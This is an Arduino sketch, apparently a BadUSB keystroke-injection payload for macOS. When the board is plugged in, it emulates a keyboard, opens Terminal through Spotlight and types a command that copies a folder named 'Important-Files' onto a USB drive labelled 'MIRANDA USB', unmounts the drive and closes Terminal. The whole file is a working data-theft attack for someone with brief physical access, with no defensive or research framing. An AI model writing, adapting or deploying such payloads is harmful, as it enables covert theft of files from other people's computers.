#include <HID-Project.h>
#include <HID-Settings.h>

void setup()
{
  // Start Keyboard
  Keyboard.begin();

  // Start Payload
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(5000);

  Keyboard.print("cp -a Important-Files /Volumes/'MIRANDA USB'/ && diskutil unmountDisk /Volumes/'MIRANDA USB' && exit");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(30000);

  // Quit terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(113);
  Keyboard.releaseAll();

  // End Payload

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}
